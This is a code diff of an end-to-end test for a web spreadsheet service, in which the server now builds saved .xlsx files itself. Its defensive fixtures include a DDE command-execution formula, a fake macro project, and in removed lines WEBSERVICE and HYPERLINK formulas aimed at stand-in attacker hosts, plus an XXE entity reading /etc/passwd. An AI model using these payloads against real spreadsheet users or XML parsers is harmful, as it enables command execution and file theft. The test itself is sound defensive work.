@@ -25,6 +25,8 @@ import { SheetsModel } from '../../apps/web/lib/sheets/model.ts';
 import { writeXlsx, readXlsx } from '../../apps/web/lib/sheets/io/xlsx.ts';
 import { readZip, writeZip } from '../../apps/web/lib/sheets/io/zip.ts';
 import { emptySheet, cellKey } from '../../apps/web/lib/sheets/workbook.ts';
+import { spawn, execSync, type ChildProcess } from 'node:child_process';
+import { fileURLToPath } from 'node:url';
 
 const API = process.env.SHEETS_API ?? 'http://localhost:5151/api';
 // The platform operator, who switches Docs (and so Sheets) on per organisation.
@@ -41,6 +43,42 @@ function check(name: string, ok: boolean, detail = '') {
 }
 const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 const b64 = (u8: Uint8Array) => Buffer.from(u8).toString('base64');
+
+// ---- the render service: spreadsheets are built on the server -----------------
+// This test owns it, as tests/docs/docs-live.test.mjs does: started on
+// DOCS_RENDER_PORT (the API's Docs:RenderUrl points there; run-docs-live.sh
+// sets both), stopped mid-run to prove a failed build fails the save.
+const RENDER_PORT = Number(process.env.DOCS_RENDER_PORT ?? 18450);
+let renderChild: ChildProcess | null = null;
+async function startRender() {
+  renderChild = spawn(process.execPath, ['--import', './src/register.mjs', 'src/server.mjs'], {
+    cwd: fileURLToPath(new URL('../../apps/render/', import.meta.url)),
+    // NODE_OPTIONS cleared: CI runs THIS test with --import ./tests/sheets/register.mjs,
+    // a path relative to the repo root that the service, started in apps/render, would
+    // not find (and its own loader is ./src/register.mjs).
+    env: { ...process.env, NODE_OPTIONS: '', PORT: String(RENDER_PORT) }, stdio: 'ignore',
+  });
+  for (let i = 0; i < 300; i += 1) { // up to 30 s: a cold start beside the API can take >10 s
+    try { if ((await fetch(`http://127.0.0.1:${RENDER_PORT}/health`)).ok) return true; } catch { /* not yet */ }
+    await sleep(100);
+  }
+  return false;
+}
+async function stopRender() {
+  renderChild?.kill();
+  renderChild = null;
+  for (let i = 0; i < 50; i += 1) { // until the port really refuses
+    try { await fetch(`http://127.0.0.1:${RENDER_PORT}/health`); } catch { return; }
+    await sleep(100);
+  }
+}
+// The one fact only the database holds (the stored search text). TATVAOS_PSQL
+// is exported by tests/lib/throwaway-db.sh: "<psql> -d <db> -Atc".
+function pg(sql: string) {
+  if (!process.env.TATVAOS_PSQL) throw new Error('TATVAOS_PSQL not set: run through tests/docs/run-docs-live.sh');
+  return execSync(`${process.env.TATVAOS_PSQL} "${sql}"`, { encoding: 'utf8' })
+    .split('\n').map((l) => l.replace(/\r$/, '')).filter((l) => l && !l.startsWith('wsl:')).pop() ?? '';
+}
 
 async function signIn(phone: string) {
   const r1 = await fetch(`${API}/auth/otp/request`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone }) });
@@ -111,6 +149,7 @@ async function waitFor(fn: () => boolean, ms = 3000) {
 
 async function main() {
   console.log(`Sheets end-to-end against ${API}\n`);
+  if (!(await startRender())) throw new Error(`the render service did not start on ${RENDER_PORT}`);
   const owner = await signIn(OWNER);
   const employee = await signIn(EMPLOYEE);
   const other = await signIn(OTHER);
@@ -206,123 +245,117 @@ async function main() {
     a1!.model!.input(s1, 4, 0) === '=SUM(A3:A4)' && a1!.model!.value(s1, 4, 0) === 200000,
     `${a1!.model!.input(s1, 4, 0)} = ${JSON.stringify(a1!.model!.value(s1, 4, 0))}`);
 
-  console.log('Checkpoint: the Space copy is a real .xlsx');
-  const snap = a1!.model!.snapshot();
-  const xlsx = await writeXlsx(snap);
-  const cp = await A(`/sheets/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
-    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '<table></table>', text: 'Fee', xlsx: b64(xlsx),
-  }) });
-  check('checkpoint with an .xlsx is accepted', cp.status === 200 && cp.body?.saved === true, `${cp.status} ${JSON.stringify(cp.body)}`);
-  const noX = await A(`/sheets/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
-    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '', text: '' }) });
-  check('a spreadsheet checkpoint WITHOUT its .xlsx is refused (400)', noX.status === 400, `${noX.status}`);
-  const notZip = await A(`/sheets/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
-    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '', text: '', xlsx: b64(new TextEncoder().encode('<html>not a zip</html>')) }) });
-  check('an .xlsx that is not a zip is refused (400)', notZip.status === 400, `${notZip.status}`);
+  console.log('Checkpoint: the server builds the Space copy from what it stored');
+  // Sheets server build, stage 2 (docs/SHEETS_SERVER_RENDER_DESIGN.md): the
+  // browser says only how far it has seen; the render service builds the
+  // .xlsx from the stored updates. Nothing else the browser sends is read.
+  const save = (extra: Record<string, unknown> = {}) => A(`/sheets/${id}/checkpoint`, { method: 'POST',
+    body: JSON.stringify({ upToSeq: a1!.lastSeq, ...extra }) });
+  const download = async () => {
+    const dl = await A(`/space/files/${id}/content`);
+    let wb = null;
+    let parts: Map<string, Uint8Array> | null = null;
+    try { wb = await readXlsx(dl.bytes); parts = await readZip(dl.bytes); } catch (e) { console.log('   ', e); }
+    return { dl, wb, parts };
+  };
+  const cp = await save();
+  check('a checkpoint carrying nothing but upToSeq is saved (200)', cp.status === 200 && cp.body?.saved === true, `${cp.status} ${JSON.stringify(cp.body)}`);
+  const first = await download();
+  check('Space download answers 200', first.dl.status === 200, `${first.dl.status}`);
+  check('…typed as an Excel file', (first.dl.headers.get('content-type') ?? '').includes('spreadsheetml'), first.dl.headers.get('content-type') ?? '');
+  check('…named .xlsx', /\.xlsx/.test(first.dl.headers.get('content-disposition') ?? ''), first.dl.headers.get('content-disposition') ?? '');
+  const cell = first.wb?.sheets[0]?.cells.get('4,0');
+  check('…and it reads back with the formula and its value, built by the server', cell?.input === '=SUM(A3:A4)' && cell?.value === 200000, JSON.stringify(cell));
 
-  const dl = await A(`/space/files/${id}/content`);
-  check('Space download answers 200', dl.status === 200, `${dl.status}`);
-  check('…typed as an Excel file', (dl.headers.get('content-type') ?? '').includes('spreadsheetml'), dl.headers.get('content-type') ?? '');
-  check('…named .xlsx', /\.xlsx/.test(dl.headers.get('content-disposition') ?? ''), dl.headers.get('content-disposition') ?? '');
-  let readBack = null;
-  try { readBack = await readXlsx(dl.bytes); } catch (e) { readBack = null; console.log('   ', e); }
-  const cell = readBack?.sheets[0]?.cells.get('4,0');
-  check('…and it reads back with the formula and its value', cell?.input === '=SUM(A3:A4)' && cell?.value === 200000, JSON.stringify(cell));
+  console.log("A colleague's edit is in the file, though the person saving never sent it");
+  const colleague = 'Typed by the second connection';
+  check('control: before the edit, the file does not have it', first.wb?.sheets[0]?.cells.get('10,0')?.input !== colleague);
+  const acksBefore = a2!.acks;
+  a2!.model!.setInputs(s1, [{ r: 10, c: 0, input: colleague }]);
+  await waitFor(() => a2!.acks > acksBefore);
+  // The OWNER saves, sending nothing of a2's edit (a stale upToSeq, even).
+  const cp2 = await A(`/sheets/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({ upToSeq: 0 }) });
+  check('the owner saves (200)', cp2.status === 200 && cp2.body?.saved === true, `${cp2.status} ${JSON.stringify(cp2.body)}`);
+  const second = await download();
+  check("…and the colleague's edit is in the file", second.wb?.sheets[0]?.cells.get('10,0')?.input === colleague,
+    JSON.stringify(second.wb?.sheets[0]?.cells.get('10,0')));
 
-  console.log('The server refuses a workbook that would attack whoever opens it');
-  // XlsxGuard.cs (Mr. Singh, 25 Sept 2026). Formulas are ordinary content and
-  // pass; macros, embedded objects, links outside the file and calling-out
-  // formulas are refused. Every refusal has its permit twin in this run.
-  const send = (bytes: Uint8Array) => A(`/sheets/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
-    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '<table></table>', text: 'Fee', xlsx: b64(bytes) }) });
-
-  // Permit 1: an ordinary workbook with ordinary formulas (incl. HYPERLINK, and "|" inside text).
+  console.log("The browser's own .xlsx is ignored: a hostile one is never stored");
+  // Built from an ordinary workbook's parts: a macro project, a link outside
+  // the file and a DDE formula, sent where the old checkpoint read the .xlsx.
+  // The formulas are what XlsxGuard refuses (tests/sheets-xlsx-guard, its
+  // own corpus); here the point is that the server never stores the
+  // browser's file at all, so none of it can reach Space.
   const plainSheet = emptySheet('Fees');
   plainSheet.cells.set(cellKey(0, 0), { input: '10' });
   plainSheet.cells.set(cellKey(1, 0), { input: '=SUM(A1:A1)*2', value: 20 });
-  plainSheet.cells.set(cellKey(2, 0), { input: '=IF(A1>5,"big|small","no")', value: 'big|small' });
-  plainSheet.cells.set(cellKey(3, 0), { input: '=HYPERLINK("https://tatvaos.com","site")', value: 'site' });
-  plainSheet.cells.set(cellKey(4, 0), { input: '=VLOOKUP(A1,A1:A2,1,FALSE)', value: 10 });
-  const plainXlsx = await writeXlsx({ sheets: [plainSheet] });
-  const permit1 = await send(plainXlsx);
-  check('permit: an ordinary workbook with ordinary formulas is stored (200)', permit1.status === 200, `${permit1.status} ${JSON.stringify(permit1.body)}`);
-
-  // Permit 2: the honest editor given dangerous INPUT writes it as text — never refused.
-  const honest = emptySheet('Fees');
-  honest.cells.set(cellKey(0, 0), { input: "=cmd|' /c calc'!A0" });
-  honest.cells.set(cellKey(1, 0), { input: '=WEBSERVICE("https://x.example/"&A1)' });
-  honest.cells.set(cellKey(2, 0), { input: "='[Budget.xlsx]Sheet1'!A1" });
-  const permit2 = await send(await writeXlsx({ sheets: [honest] }));
-  check('permit: what the editor writes from dangerous-looking input is stored (it became text)', permit2.status === 200,
-    `${permit2.status} ${JSON.stringify(permit2.body)}`);
-
-  // The hostile variants, each built from the ordinary workbook's own parts.
-  const base = await readZip(plainXlsx);
+  const base = await readZip(await writeXlsx({ sheets: [plainSheet] }));
   const text = (name: string) => new TextDecoder().decode(base.get(name)!);
-  const build = async (changes: Record<string, string | Uint8Array | null>) => {
-    const files = new Map(base);
-    for (const [name, v] of Object.entries(changes)) {
-      if (v === null) files.delete(name); else files.set(name, typeof v === 'string' ? new TextEncoder().encode(v) : v);
-    }
-    return writeZip([...files].map(([name, data]) => ({ name, data })));
-  };
-  const withFormula = (f: string) => text('xl/worksheets/sheet1.xml').replace(/<f>SUM\(A1:A1\)\*2<\/f>/, `<f>${f}</f>`);
-  // Permit 3: the same substitution with an ordinary formula goes through — so each
-  // refusal below is the RULE firing, not the substitution breaking the file.
-  const permit3 = await send(await build({ 'xl/worksheets/sheet1.xml': withFormula('&quot;a|b[c]&quot;&amp;A1') }));
-  check('permit: a hand-substituted formula with "|" and "[" only inside quoted text is stored', permit3.status === 200,
-    `${permit3.status} ${JSON.stringify(permit3.body)}`);
-  const permitLink = await send(await build({ 'xl/worksheets/sheet1.xml': withFormula('HYPERLINK(&quot;mailto:office@school.in&quot;,&quot;Write&quot;)&amp;HYPERLINK(&quot;https://tatvaos.com/?id=&quot;&amp;A1)') }));
-  check('permit: mailto and https HYPERLINKs (one completed from a cell) are stored', permitLink.status === 200,
-    `${permitLink.status} ${JSON.stringify(permitLink.body)}`);
-  check('…and the substitution really happened (calibration)', withFormula('X') !== text('xl/worksheets/sheet1.xml'));
+  const hostileFiles = new Map(base);
+  hostileFiles.set('xl/vbaProject.bin', new Uint8Array([1, 2, 3]));
+  hostileFiles.set('xl/externalLinks/externalLink1.xml', new TextEncoder().encode('<externalLink/>'));
+  hostileFiles.set('xl/worksheets/sheet1.xml', new TextEncoder().encode(
+    text('xl/worksheets/sheet1.xml').replace(/<f>SUM\(A1:A1\)\*2<\/f>/, "<f>cmd|' /c calc'!A0</f>")));
+  check('…the hostile workbook really carries the DDE formula (calibration)',
+    new TextDecoder().decode(hostileFiles.get('xl/worksheets/sheet1.xml')!).includes('cmd|'));
+  const hostile = await writeZip([...hostileFiles].map(([name, data]) => ({ name, data })));
+  a1!.model!.setInputs(s1, [{ r: 11, c: 0, input: 'Saved with a hostile file attached' }]);
+  await sleep(600);
+  const cp3 = await save({ state: b64(new Uint8Array([1, 2, 3])), html: '<script>x</script>', text: 'not the text', xlsx: b64(hostile) });
+  check("a save sending a hostile .xlsx, a fake state and fake HTML is not refused: they are ignored (200)",
+    cp3.status === 200 && cp3.body?.saved === true, `${cp3.status} ${JSON.stringify(cp3.body)}`);
+  const third = await download();
+  const names = [...(third.parts?.keys() ?? [])];
+  const sheetXml = new TextDecoder().decode(third.parts?.get('xl/worksheets/sheet1.xml') ?? new Uint8Array());
+  check('…the stored file has no macro project and no external link', names.length > 0
+    && !names.some((n) => /vbaProject|externalLink/i.test(n)), JSON.stringify(names));
+  check('…no DDE formula', sheetXml.length > 0 && !sheetXml.includes('cmd|'));
+  check("…and it is the server's build of the real spreadsheet", third.wb?.sheets[0]?.cells.get('11,0')?.input === 'Saved with a hostile file attached'
+    && third.wb?.sheets[0]?.cells.get('4,0')?.value === 200000, JSON.stringify(third.wb?.sheets[0]?.cells.get('11,0')));
+  // The stored search text, read from the database (only it can say).
+  check("…and its stored text is the server's: the spreadsheet's words, not the browser's",
+    pg(`SELECT (text_content LIKE '%Saved with a hostile file attached%')::int || ',' || (text_content LIKE '%not the text%')::int FROM docs.documents WHERE file_id = '${id}'`) === '1,0');
 
-  const hostile: [string, string, Record<string, string | Uint8Array | null>][] = [
-    ['a macro project (vbaProject.bin)', 'macro_or_binary_part', { 'xl/vbaProject.bin': new Uint8Array([1, 2, 3]) }],
-    ['a macro-enabled content type', 'macro_content_type', { '[Content_Types].xml': text('[Content_Types].xml').replace('</Types>',
-      '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/></Types>') }],
-    ['an embedded object', 'embedded_object', { 'xl/embeddings/Microsoft_Word_Document.docx': new Uint8Array([80, 75, 3, 4]) }],
-    ['an external-link part', 'external_link', { 'xl/externalLinks/externalLink1.xml': '<externalLink/>' }],
-    ['a data connection', 'data_connection', { 'xl/connections.xml': '<connections/>' }],
-    ['a relationship pointing outside the file', 'external_relationship', { 'xl/_rels/workbook.xml.rels': text('xl/_rels/workbook.xml.rels').replace('</Relationships>',
-      '<Relationship Id="rX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://evil.example/" TargetMode="External"/></Relationships>') }],
-    ['a DDE formula', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula("cmd|' /c calc'!A0") }],
-    ['a formula into another workbook', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('[1]Sheet1!A1') }],
-    ['a web-fetching formula', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('_xlfn.WEBSERVICE(&quot;https://x.example/&quot;&amp;A1)') }],
-    ['a defined name that runs DDE', 'calling_out_formula', { 'xl/workbook.xml': text('xl/workbook.xml').replace('</workbook>',
-      '<definedNames><definedName name="evil">cmd|\' /c calc\'!A0</definedName></definedNames></workbook>') }],
-    ['a HYPERLINK to a file: address', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('HYPERLINK(&quot;file://attacker/share/x&quot;,&quot;open&quot;)') }],
-    ['a HYPERLINK to a Windows network path', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('HYPERLINK(&quot;' + String.fromCharCode(92, 92) + 'attacker' + String.fromCharCode(92) + 'share&quot;)') }],
-    ['a HYPERLINK whose target comes from a cell', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('HYPERLINK(A1,&quot;x&quot;)') }],
-    ['a DOCTYPE', 'doctype', { 'xl/sharedStrings.xml': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><sst/>' }],
-  ];
-  for (const [label, reason, changes] of hostile) {
-    const r = await send(await build(changes));
-    check(`refused: ${label} (400 ${reason})`, r.status === 400 && r.body?.reason === reason, `${r.status} ${JSON.stringify(r.body)}`);
-  }
-  // Put the real workbook back as the Space copy for the checks that follow.
-  const restored = await send(xlsx);
-  check('the real workbook is stored again', restored.status === 200, `${restored.status}`);
+  console.log('A failed build fails the save, visibly, and keeps the edits');
+  await stopRender();
+  a1!.model!.setInputs(s1, [{ r: 12, c: 0, input: 'Typed while the render service was down' }]);
+  await sleep(600);
+  const down = await save();
+  check('with the render service down, the save is refused (503 render_failed)', down.status === 503 && down.body?.reason === 'render_failed',
+    `${down.status} ${JSON.stringify(down.body)}`);
+  check('…with a sentence to show', typeof down.body?.error === 'string' && down.body.error.length > 20);
+  const downVer = await A(`/sheets/${id}/versions`, { method: 'POST', body: JSON.stringify({ kind: 'named', name: 'While down' }) });
+  check('…and so is a named version (503 render_failed)', downVer.status === 503 && downVer.body?.reason === 'render_failed', `${downVer.status}`);
+  const during = await download();
+  check('…and Space still serves the last good file, unchanged', during.wb?.sheets[0]?.cells.get('11,0')?.input === 'Saved with a hostile file attached'
+    && during.wb?.sheets[0]?.cells.get('12,0') === undefined);
+  if (!(await startRender())) throw new Error('the render service did not restart');
+  const up = await save();
+  check('the render service back, the next save succeeds (200)', up.status === 200 && up.body?.saved === true, `${up.status} ${JSON.stringify(up.body)}`);
+  const after = await download();
+  check('…and the edit typed while it was down is in the file', after.wb?.sheets[0]?.cells.get('12,0')?.input === 'Typed while the render service was down');
 
   console.log('Documents and spreadsheets do not cross');
   const doc = await A('/docs', { method: 'POST', body: JSON.stringify({ title: 'E2E doc', scope: 'personal' }) });
-  // Each kind saves through its own routes (1 Oct 2026): a document's file is
-  // built on the server (/api/docs), a spreadsheet's is still its browser's
-  // .xlsx (/api/sheets). Each route refuses the other kind; the permit twins
-  // are the spreadsheet saves above and the named version below.
-  const docCp = await A(`/sheets/${doc.body.id}/checkpoint`, { method: 'POST', body: JSON.stringify({
-    state: b64(Y.encodeStateAsUpdate(new Y.Doc())), upToSeq: 0, html: '<p>x</p>', text: 'x', xlsx: b64(xlsx) }) });
+  // Each kind saves through its own routes (1 Oct 2026), and each is built
+  // by its own renderer: a spreadsheet given to the Docs renderer would come
+  // back as an empty page. Each route refuses the other kind; the permit
+  // twins are the spreadsheet saves above and the named version below.
+  const docCp = await A(`/sheets/${doc.body.id}/checkpoint`, { method: 'POST', body: JSON.stringify({ upToSeq: 0 }) });
   check('a DOCUMENT saved through the spreadsheet route is refused (400)', docCp.status === 400, `${docCp.status} ${JSON.stringify(docCp.body)}`);
   const sheetViaDocs = await A(`/docs/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({ upToSeq: a1!.lastSeq }) });
   check('a SPREADSHEET saved through the document route is refused (400)', sheetViaDocs.status === 400, `${sheetViaDocs.status} ${JSON.stringify(sheetViaDocs.body)}`);
   const sheetVerViaDocs = await A(`/docs/${id}/versions`, { method: 'POST', body: JSON.stringify({ kind: 'named', name: 'x' }) });
   check('a SPREADSHEET version through the document route is refused (400)', sheetVerViaDocs.status === 400, `${sheetVerViaDocs.status} ${JSON.stringify(sheetVerViaDocs.body)}`);
-  const docVerViaSheets = await A(`/sheets/${doc.body.id}/versions`, { method: 'POST', body: JSON.stringify({
-    kind: 'named', name: 'x', state: b64(Y.encodeStateAsUpdate(new Y.Doc())), html: '<p>x</p>' }) });
+  const docVerViaSheets = await A(`/sheets/${doc.body.id}/versions`, { method: 'POST', body: JSON.stringify({ kind: 'named', name: 'x' }) });
   check('a DOCUMENT version through the spreadsheet route is refused (400)', docVerViaSheets.status === 400, `${docVerViaSheets.status} ${JSON.stringify(docVerViaSheets.body)}`);
   const sheetVer = await A(`/sheets/${id}/versions`, { method: 'POST', body: JSON.stringify({
-    kind: 'named', name: 'E2E named', state: b64(Y.encodeStateAsUpdate(a1!.doc)), html: '<table></table>' }) });
+    kind: 'named', name: 'E2E named', html: '<table><tr><td>not the server</td></tr></table>' }) });
   check('…its permit twin: a spreadsheet version through its own route is saved (201)', sheetVer.status === 201, `${sheetVer.status} ${JSON.stringify(sheetVer.body)}`);
+  const verBody = sheetVer.status === 201 ? await A(`/docs/${id}/versions/${sheetVer.body.id}`) : null;
+  const verText = JSON.stringify(verBody?.body ?? {});
+  check("…built by the server from what it stored: it holds the spreadsheet, not the browser's HTML",
+    verText.includes('Typed while the render service was down') && !verText.includes('not the server'), verText.slice(0, 200));
   const docAi = await A(`/sheets/${doc.body.id}/ai`, { method: 'POST', body: JSON.stringify({ action: 'analyze', context: 'a\tb' }) });
   check('Sheets AI on a document is 404', docAi.status === 404, `${docAi.status}`);
 
@@ -429,8 +462,9 @@ async function main() {
   check('switched back on, the spreadsheet is still there', back.status === 200 && back.body?.title === 'E2E fees', `${back.status}`);
 
   for (const s of [a1, a2]) { s?.model?.destroy(); s?.ws.close(); }
+  await stopRender();
   console.log(`\n${passed} passed, ${failed} failed`);
   process.exit(failed === 0 ? 0 : 1);
 }
 
-main().catch((e) => { console.error(e); process.exit(2); });
+main().catch((e) => { console.error(e); renderChild?.kill(); process.exit(2); });
